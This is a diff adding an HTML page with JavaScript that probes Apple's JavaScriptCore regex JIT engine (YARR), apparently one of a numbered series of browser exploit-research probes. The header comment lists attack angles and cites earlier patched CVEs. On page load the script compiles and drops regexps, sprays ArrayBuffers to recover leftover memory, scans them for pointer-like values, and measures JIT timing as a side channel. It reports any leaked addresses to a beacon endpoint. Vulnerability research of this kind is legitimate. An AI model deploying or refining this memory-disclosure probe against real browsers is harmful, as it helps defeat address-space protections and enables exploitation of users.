@@ -1,0 +1,332 @@
+<!--
+  p769: RegExp YARR JIT residue / compilation timing oracle
+
+  JSC's regex engine (YARR) JIT-compiles regular expressions into
+  native code when they are used enough times. The compiled code lives
+  in executable memory alongside DFG JIT code. When a RegExp object is
+  garbage-collected, its YARR JIT code is freed.
+
+  Key insight: YARR JIT code objects have a specific size that depends
+  on the pattern complexity. Simple patterns produce small JIT stubs;
+  complex patterns (alternations, captures, lookahead) produce larger
+  ones. If we can determine the YARR JIT allocation size for a known
+  pattern, we can spray ArrayBuffers of matching size after GC and
+  look for residual JIT code pointers in the reclaimed memory.
+
+  Additionally: YARR JIT compilation timing is pattern-dependent and
+  measurable. The first exec() of a complex pattern takes longer than
+  subsequent ones (interpreted vs JIT). The timing delta reveals whether
+  JIT compilation occurred, and the absolute timing may correlate with
+  the JIT region's distance from the heap (cache effects).
+
+  YARR also has an interpreter fallback for patterns too complex to
+  JIT. The threshold between JIT and interpreter is observable via
+  timing, and the interpreter allocates differently from JIT code.
+
+  Attack angles:
+  A) YARR JIT residue: create/compile/drop regexps, spray matching ABs.
+  B) Pattern complexity vs compilation timing oracle.
+  C) RegExp.prototype.exec() first-call latency as JIT detector.
+  D) Backreference/lookahead JIT threshold detection.
+  E) RegExp lastIndex manipulation during exec as side channel.
+  F) RegExp source/flags string allocation interleave.
+
+  CRASH_CLASS: LOW (RegExp operations, no side effects)
+  prior art: p659 (YARR CVE patched), p628 (YARR OOB patched),
+  p602 (DFG JIT confirmed), p765 (JIT CodeBlock spray)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p769</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p769-START');
+
+// === Section A: YARR JIT residue via create/compile/drop/spray ===
+try{
+  b('A-yarr-residue');
+  var patterns=[
+    /\d+/g,
+    /^[a-zA-Z_]\w*$/,
+    /(\d{1,3}\.){3}\d{1,3}/,
+    /^(?=.*[A-Z])(?=.*[a-z])(?=.*\d).{8,}$/,
+    /((?:[a-z]+\.)+[a-z]{2,})/gi,
+    /(?:(?:\r\n|\r|\n)(?:[ \t]+))+/g,
+    /^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)$/
+  ];
+  var testStr='Hello World 192.168.1.1 Test123 foo.bar.com\r\n  continued Password1!';
+
+  var aHits=0;
+  var SIZES=[48,64,96,128,192,256,384,512];
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+
+    (function(){
+      var regexps=[];
+      for(var round=0;round<50;round++){
+        for(var pi=0;pi<patterns.length;pi++){
+          var re=new RegExp(patterns[pi].source, patterns[pi].flags);
+          for(var w=0;w<100;w++)re.exec(testStr);
+          regexps.push(re);
+        }
+      }
+    })();
+
+    for(var i=0;i<5000;i++){var tmp=new ArrayBuffer(64);}
+
+    var abs=[];
+    for(var i=0;i<500;i++){
+      abs.push(new ArrayBuffer(sz));
+    }
+    var szHits=0;
+    for(var i=0;i<abs.length;i++){
+      var dv=new DataView(abs[i]);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('A-PTR sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    aHits+=szHits;
+    b('A sz='+sz+' hits='+szHits);
+    abs=null;
+  }
+  b('A-DONE total='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: Pattern complexity vs compilation timing ===
+try{
+  b('B-complexity-timing');
+  var complexPatterns=[
+    {name:'simple', src:'\\d+'},
+    {name:'charclass', src:'[a-zA-Z0-9_]+'},
+    {name:'alternation', src:'foo|bar|baz|qux|quux'},
+    {name:'capture3', src:'(\\w+)\\s+(\\w+)\\s+(\\w+)'},
+    {name:'lookahead', src:'(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,}'},
+    {name:'backref', src:'(\\w+)\\s+\\1'},
+    {name:'nested', src:'((\\w+)(\\s+(\\w+))*)+'},
+    {name:'complex', src:'(?:(?:[a-z][\\w-]*(?:\\.[a-z][\\w-]*)*@(?:[a-z][\\w-]*\\.)+[a-z]{2,})|(?:\\d{1,3}(?:\\.\\d{1,3}){3}))'}
+  ];
+
+  var input='Hello World 192.168.1.1 user@example.com Test Test Password1Abc repeated repeated';
+
+  for(var ci=0;ci<complexPatterns.length;ci++){
+    var cp=complexPatterns[ci];
+    var re=new RegExp(cp.src);
+
+    var t0=Date.now();
+    re.exec(input);
+    var tFirst=Date.now()-t0;
+
+    var t1=Date.now();
+    for(var i=0;i<10000;i++)re.exec(input);
+    var tWarm=Date.now()-t1;
+
+    var re2=new RegExp(cp.src);
+    var t2=Date.now();
+    re2.exec(input);
+    var tCold2=Date.now()-t2;
+
+    b('B '+cp.name+' first='+tFirst+'ms warm_10k='+tWarm+'ms cold2='+tCold2+'ms');
+  }
+  b('B-DONE');
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: exec() first-call latency measurement ===
+try{
+  b('C-exec-latency');
+
+  function measureFirstExec(pattern, input, warmCount){
+    var times=[];
+    for(var trial=0;trial<20;trial++){
+      var re=new RegExp(pattern);
+      if(warmCount>0){
+        for(var i=0;i<warmCount;i++)re.exec(input);
+      }
+      var re2=new RegExp(pattern);
+      var t0=Date.now();
+      for(var i=0;i<1000;i++){
+        var re3=new RegExp(pattern);
+        re3.exec(input);
+      }
+      times.push(Date.now()-t0);
+    }
+    var mn=times[0],mx=times[0],sum=0;
+    for(var i=0;i<times.length;i++){
+      if(times[i]<mn)mn=times[i];
+      if(times[i]>mx)mx=times[i];
+      sum+=times[i];
+    }
+    return {min:mn,max:mx,avg:(sum/times.length).toFixed(1)};
+  }
+
+  var r1=measureFirstExec('\\d+','hello 123 world',0);
+  b('C simple_cold min='+r1.min+' max='+r1.max+' avg='+r1.avg+'ms');
+
+  var r2=measureFirstExec('\\d+','hello 123 world',10000);
+  b('C simple_after_warm min='+r2.min+' max='+r2.max+' avg='+r2.avg+'ms');
+
+  var r3=measureFirstExec('(?=.*\\d)(?=.*[a-z]).{8,}','Password1abc',0);
+  b('C complex_cold min='+r3.min+' max='+r3.max+' avg='+r3.avg+'ms');
+
+  var r4=measureFirstExec('(?=.*\\d)(?=.*[a-z]).{8,}','Password1abc',10000);
+  b('C complex_after_warm min='+r4.min+' max='+r4.max+' avg='+r4.avg+'ms');
+
+  b('C-DONE');
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: Backreference/lookahead JIT threshold ===
+try{
+  b('D-jit-threshold');
+
+  function timePattern(src, input, iters){
+    var re=new RegExp(src);
+    var t0=Date.now();
+    for(var i=0;i<iters;i++)re.exec(input);
+    return Date.now()-t0;
+  }
+
+  var input='aaabbbcccdddeeefffggghhhiiijjj';
+  var backrefs=[
+    {name:'br0', src:'(\\w+)'},
+    {name:'br1', src:'(\\w)\\1'},
+    {name:'br2', src:'(\\w)(\\w)\\1\\2'},
+    {name:'br3', src:'(\\w)(\\w)(\\w)\\1\\2\\3'},
+    {name:'br5', src:'(\\w)(\\w)(\\w)(\\w)(\\w)\\1\\2\\3\\4\\5'},
+  ];
+
+  for(var bi=0;bi<backrefs.length;bi++){
+    var p=backrefs[bi];
+    var tCold=timePattern(p.src,input,1);
+    var tWarm=timePattern(p.src,input,100000);
+    b('D '+p.name+' cold='+tCold+'ms warm_100k='+tWarm+'ms per='+(tWarm/100000*1000).toFixed(3)+'us');
+  }
+
+  var lookaheads=[
+    {name:'la1', src:'(?=a)\\w+'},
+    {name:'la2', src:'(?=a)(?=.*b)\\w+'},
+    {name:'la3', src:'(?=a)(?=.*b)(?=.*c)\\w+'},
+    {name:'la5', src:'(?=a)(?=.*b)(?=.*c)(?=.*d)(?=.*e)\\w+'},
+    {name:'neg2', src:'(?!x)(?!y)\\w+'},
+  ];
+
+  for(var li=0;li<lookaheads.length;li++){
+    var p=lookaheads[li];
+    var tWarm=timePattern(p.src,input,100000);
+    b('D '+p.name+' warm_100k='+tWarm+'ms per='+(tWarm/100000*1000).toFixed(3)+'us');
+  }
+  b('D-DONE');
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: lastIndex manipulation during exec ===
+try{
+  b('E-lastindex');
+
+  var re=/(\w+)/g;
+  var input='alpha beta gamma delta epsilon';
+  var matches=[];
+  var indices=[];
+  var m;
+  while((m=re.exec(input))!==null){
+    matches.push(m[1]);
+    indices.push(re.lastIndex);
+  }
+  b('E normal matches='+matches.length+' indices=['+indices.join(',')+']');
+
+  var re2=/(\w+)/g;
+  var manipulated=[];
+  re2.lastIndex=0;
+  for(var i=0;i<10;i++){
+    var m=re2.exec(input);
+    if(!m)break;
+    manipulated.push({word:m[1],li:re2.lastIndex});
+    re2.lastIndex=Math.max(0,re2.lastIndex-2);
+  }
+  b('E manipulated_count='+manipulated.length);
+  for(var i=0;i<Math.min(5,manipulated.length);i++){
+    b('E  ['+i+'] word='+manipulated[i].word+' li='+manipulated[i].li);
+  }
+
+  var re3=/\d+/g;
+  var numInput='111 222 333 444 555';
+  for(var w=0;w<50000;w++)re3.exec(numInput);
+
+  re3.lastIndex=0;
+  var t0=Date.now();
+  for(var i=0;i<100000;i++){
+    re3.lastIndex=0;
+    re3.exec(numInput);
+  }
+  var tReset=Date.now()-t0;
+
+  var t1=Date.now();
+  for(var i=0;i<100000;i++){
+    re3.exec(numInput);
+    if(!re3.lastIndex)re3.lastIndex=0;
+  }
+  var tNatural=Date.now()-t1;
+
+  b('E reset_100k='+tReset+'ms natural_100k='+tNatural+'ms ratio='+(tReset/Math.max(1,tNatural)).toFixed(2));
+  b('E-DONE');
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: RegExp source/flags string interleave ===
+try{
+  b('F-string-interleave');
+  var fHits=0;
+
+  (function(){
+    var regexps=[];
+    for(var i=0;i<200;i++){
+      var src='pattern_'+i+'_'+'x'.repeat(50+i);
+      var re=new RegExp(src,'gi');
+      for(var w=0;w<100;w++)re.exec('pattern_'+i+'_xxxxx');
+      regexps.push(re);
+    }
+    var sources=[];
+    for(var i=0;i<regexps.length;i++){
+      sources.push(regexps[i].source);
+      sources.push(regexps[i].flags);
+    }
+    b('F created '+regexps.length+' regexps, '+sources.length+' strings');
+  })();
+
+  for(var i=0;i<5000;i++){var tmp=new ArrayBuffer(128);}
+
+  if(typeof BigUint64Array!=='undefined'){
+    for(var trial=0;trial<20;trial++){
+      var ab=new ArrayBuffer(128);
+      var big=new BigUint64Array(ab);
+      for(var i=0;i<big.length;i++){
+        if(big[i]!==0n){
+          var val=big[i];
+          var hi=Number(val>>32n);
+          var lo=Number(val&0xFFFFFFFFn);
+          if(hi>0x100 && hi<0x80000000){
+            fHits++;
+            if(fHits<=5)b('F-PTR trial='+trial+' idx='+i+' val=0x'+hi.toString(16)+lo.toString(16).padStart(8,'0'));
+          }
+        }
+      }
+    }
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+setTimeout(function(){b('p769-COMPLETE');},500);
+};
+</script>
+</head>
+<body></body></html>
